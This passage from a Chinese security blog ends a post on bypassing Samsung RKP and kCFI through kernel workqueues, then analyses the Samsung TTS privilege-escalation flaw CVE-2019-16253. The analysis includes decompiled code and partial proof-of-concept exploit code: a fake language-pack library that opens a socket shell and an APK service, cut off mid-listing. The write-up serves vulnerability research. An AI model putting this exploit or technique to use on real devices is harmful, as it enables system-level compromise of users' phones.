<h2 id="Running-arbitrary-root-commands-using-ret2kworker-TM"><a href="#Running-arbitrary-root-commands-using-ret2kworker-TM" class="headerlink" title="Running arbitrary root commands using ret2kworker(TM)"></a>Running arbitrary root commands using ret2kworker(TM)</h2><p>在三星设备上获得<code>root</code>权限的一个众所周知的问题是三星的<code>RKP</code>（实时内核保护）所施加的保护。在安卓设备上获得<code>root</code>权限的一个常见方法是用<code>root</code>权限覆盖我们自己进程的证书。然而，三星的<code>RKP</code>写保护每个进程的凭证，所以这在这里是不可能的。在作者的上一次<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">利用</a>中，能够以<code>root</code>身份执行任意代码，因为所利用的特定UAF导致一个受控函数指针在以<code>root</code>身份运行的<code>kworker</code>的代码中被执行。</p>
<p>当然，通过任意的内存读写原语，可以简单地将对象添加到这些工作队列之一（基本上是包含工作结构的链接列表），并等待一个<code>kworker</code>来接取工作。事实证明，许多这些工作队列确实是静态的全局对象，在内核镜像中具有固定的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffc012c8f7e0 D system_wq</span><br><span class="line">ffffffc012c8f7e8 D system_highpri_wq</span><br><span class="line">ffffffc012c8f7f0 D system_long_wq</span><br><span class="line">ffffffc012c8f7f8 D system_unbound_wq</span><br><span class="line">ffffffc012c8f800 D system_freezable_wq</span><br><span class="line">ffffffc012c8f808 D system_power_efficient_wq</span><br><span class="line">ffffffc012c8f810 D system_freezable_power_efficient_wq</span><br></pre></td></tr></table></figure>

<p>因此，将条目添加到这些工作队列中并让<code>kworker</code>来处理这些工作是比较直接的。然而，由于<code>kCFI</code>，只能调用具有以下签名的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (func*)(<span class="keyword">struct</span> work_struct *work)</span><br></pre></td></tr></table></figure>

<p>是否能找到一个足够强大的函数来运行？结果相当简单。函数<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/kernel/umh.c#L190"><code>call_usermodehelper_exec_work</code></a>，通常在内核漏洞中被用来运行<code>shell</code>命令，它符合这个要求，可以运行提供的<code>shell</code>命令。因此，通过修改，比如说，<code>system_unbound_wq</code>，并在其中添加一个持有<code>call_usermodehelper_exec_work</code>指针的条目，可以绕过三星的<code>RKP</code>和<code>kCFI</code>，以<code>root</code>身份运行任意命令。</p>
<h1 id="复现情况"><a href="#复现情况" class="headerlink" title="复现情况"></a>复现情况</h1><p>需要<code>Snapdragon 888</code>及以上芯片的测试机，目前没有。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://github.blog/2022-06-16-the-android-kernel-mitigations-obstacle-race/">The Android kernel mitigations obstacle race</a></p>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html">The More You Know, The More You Know You Don’t Know</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/06/14/Samsung-TTS-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2019-16253/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/14/Samsung-TTS-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2019-16253/" class="post-title-link" itemprop="url">Samsung TTS 提权漏洞(CVE-2019-16253)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-14 21:03:22" itemprop="dateCreated datePublished" datetime="2022-06-14T21:03:22+08:00">2022-06-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-06-16 20:32:45" itemprop="dateModified" datetime="2022-06-16T20:32:45+08:00">2022-06-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Text-To-Speech</code>引擎是在<code>Android</code>手机中默认开启的，但是厂商在实现的时候出了问题，就是本章的<code>CVE-2019-16253</code>。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p><code>SamsungTTS</code> before 3.0.02.7&#x2F;3.0.00.101<br>补丁信息：</p>
<ul>
<li>Android N,O or older : 3.0.00.101 </li>
<li>Android P : 3.0.02.7</li>
</ul>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p><code>Samsung TTS</code>以<code>system uid</code>进行运行，提供<code>TTS</code>功能，因此漏洞利用可以以<code>system</code>权限返回一个<code>shell</code>。</p>
<p><code>com.samsung.SMT.mgr.LangPackMgr$2</code>动态注册了一个<code>receiver</code>，其接收带有<code>com.samsung.SMT.ACTION_INSTALL_FINISHED</code>的<code>Intent</code>。<code>receiver</code>盲目的信任传入数据中的<code>SMT_ENGINE_PATH</code>，经过一些处理以后，<code>LangPackMgr.updateEngine</code>通过调用<code>com.samsung.SMT.engine.SmtTTS-&gt;reloadEngine</code>（最终调用<code>System-&gt;load</code>）创建一个线程，加载执行<code>SMT_ENGINE_PATH</code>指向的<code>so</code>库，导致在<code>Samsung TTS</code>执行任意代码。</p>
<p>还有两点：</p>
<ul>
<li>漏洞不需要手动启动恶意<code>APP</code>，只要启用了<code>Samsung TTS</code>，它监听应用程序安装卸载，当发现有以<code>com.samsung.SMT.lang</code>开头的包安装时，就会启动该应用程序的服务；</li>
<li><code>Samsung TTS</code>将在设备启动时，运行注册的库，因此可以实现静默持久化。</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$2</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg10, Intent arg11)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg11.getAction().equals(<span class="string">&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;</span>)) &#123;</span><br><span class="line">           <span class="comment">//...</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_1</span> <span class="operator">=</span> arg11.getIntExtra(<span class="string">&quot;SMT_ENGINE_VERSION&quot;</span>, v7);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg11.getStringExtra(<span class="string">&quot;SMT_ENGINE_PATH&quot;</span>);  <span class="comment">// 1</span></span><br><span class="line">            <span class="keyword">if</span>(v0_1 &gt; SmtTTS.get().getEngineVersion() &amp;&amp; (CString.isValid(v2))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(CFile.isExist(v2)) &#123;</span><br><span class="line">                    LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).add(<span class="keyword">new</span> <span class="title class_">LangPackMgr$UpdateEngineInfo</span>(v0_1, v2));</span><br><span class="line">                    CLog.i(CLog$eLEVEL.D, <span class="string">&quot;LangPackMgr - Add candidate engine [%d][%s]&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Integer.valueOf(v0_1), v2&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    CLog.e(<span class="string">&quot;LangPackMgr - Invalid engine = &quot;</span> + v2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            LangPackMgr.decreaseTriggerCount(<span class="built_in">this</span>.a);</span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getTriggerPackageCount(<span class="built_in">this</span>.a) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            LangPackMgr.doUpdateEngine(<span class="built_in">this</span>.a);  <span class="comment">// 2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadUpdateEngine == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadUpdateEngine.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine = <span class="keyword">new</span> <span class="title class_">LangPackMgr$EngineUpdateThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadUpdateEngine.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        LangPackMgr$EngineUpdateThread(LangPackMgr arg1, LangPackMgr$<span class="number">1</span> arg2) &#123;</span><br><span class="line">        <span class="built_in">this</span>(arg1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">goto</span> label_20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = LangPackMgr.getUpdateEngineQueue(<span class="built_in">this</span>.a).poll();</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">            <span class="keyword">if</span>(v1 != <span class="literal">null</span> &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).VERSION &gt; SmtTTS.get().getEngineVersion()) &#123;</span><br><span class="line">                CHelper.get().set_INSTALLED_ENGINE_PATH(((LangPackMgr$UpdateEngineInfo)v1).PATH);</span><br><span class="line">                <span class="keyword">if</span>(SmtTTS.get().reloadEngine()) &#123;</span><br><span class="line">                </span><br><span class="line">-----</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">reloadEngine</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v0_2</span> <span class="operator">=</span> CHelper.get().INSTALLED_ENGINE_PATH();</span><br><span class="line">            <span class="keyword">if</span>(CString.isValid(v0_2)) &#123;</span><br><span class="line">                System.load(v0_2); <span class="comment">// &lt;- triggers load</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_70;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>以上可知：</p>
<ul>
<li><code>SMT_ENGINE_VERSION</code>应该大于内置的版本361811291；</li>
<li><code>mTriggerCount</code>应该首先被增加，可以通过提供一个包名以<code>com.samsung.SMT.lang</code>开始的包实现。<code>com.samsung.SMT.SamsungTTSService</code>注册了两个<code>receiver</code>，其中一个用于扫描包的前缀，并增加<code>mTriggerCount</code>。</li>
</ul>
<p>下面的代码将调用恶意服务而不需要交互：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$1</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    LangPackMgr$<span class="number">1</span>(LangPackMgr arg1) &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = arg1;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context arg4, Intent arg5)</span> &#123;  <span class="comment">// 监听包安装卸载</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> arg5.getAction();</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> arg5.getData().getSchemeSpecificPart();</span><br><span class="line">        <span class="keyword">if</span>(((v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_ADDED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_CHANGED&quot;</span>)) || (v0.equals(<span class="string">&quot;android.intent.action.PACKAGE_REMOVED&quot;</span>))) &amp;&amp; (v1 != <span class="literal">null</span> &amp;&amp; (v1.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)))) &#123;</span><br><span class="line">            <span class="built_in">this</span>.a.syncLanguagePack();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">triggerLanguagePack</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.mThreadTriggerLanguagePack == <span class="literal">null</span> || !<span class="built_in">this</span>.mThreadTriggerLanguagePack.isAlive()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack = <span class="keyword">new</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span>(<span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mThreadTriggerLanguagePack.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.mgr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LangPackMgr$LanguagePackTriggerThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        Object v0_1;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">v5</span> <span class="operator">=</span> LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).getPackageManager().getInstalledPackages(<span class="number">0x2000</span>).iterator();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">                <span class="keyword">if</span>(!((PackageInfo)v0_1).packageName.startsWith(<span class="string">&quot;com.samsung.SMT.lang&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            <span class="keyword">goto</span> label_53;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v1_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(((PackageInfo)v0_1).packageName);</span><br><span class="line">            v1_1.setPackage(((PackageInfo)v0_1).packageName);</span><br><span class="line">            LangPackMgr.f(<span class="built_in">this</span>.langpackmgr).startService(v1_1);  <span class="comment">// 启动对应的APP的服务</span></span><br><span class="line">            LangPackMgr.increaseTriggerCount(<span class="built_in">this</span>.langpackmgr);</span><br></pre></td></tr></table></figure>

<p><code>Samsung TTS</code>加载的库需要实现一个接口，以看上去像一个<code>language pack</code>，这个通过逆向默认的库来实现。</p>
<p>最终的流程如下：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/smt-flow.png" alt="smt-flow" style="zoom: 75%;" />

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="so库编写"><a href="#so库编写" class="headerlink" title="so库编写"></a>so库编写</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , <span class="string">&quot;mercury-native&quot;</span>, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_initialize</span> <span class="params">( JNIEnv* env,</span></span><br><span class="line"><span class="params">                                                  jobject thiz )</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6) </span></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_setLanguage</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)</span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint <span class="title function_">Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable</span><span class="params">(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">doload</span><span class="params">()</span> &#123;</span><br><span class="line">  LOGE(<span class="string">&quot;SMTEXP: my uid is %d, pid is %d&quot;</span>, getuid(), getpid());</span><br><span class="line">  run_socket_sh_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="APK编写"><a href="#APK编写" class="headerlink" title="APK编写"></a>APK编写</h2><p>注册一个服务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.SMT.lang.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyService</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">copyfile</span><span class="params">(String input, String output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">myOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(output);</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">myInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(input);</span><br><span class="line">        <span class="keyword">while</span> ((length = myInput.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            myOutput.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        myInput.close();</span><br><span class="line">        myOutput.flush();</span><br><span class="line">        myOutput.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplicationInfo().nativeLibraryDir + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;libmstring.so&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.samsung.SMT.lang.poc/libmstring.so&quot;</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span 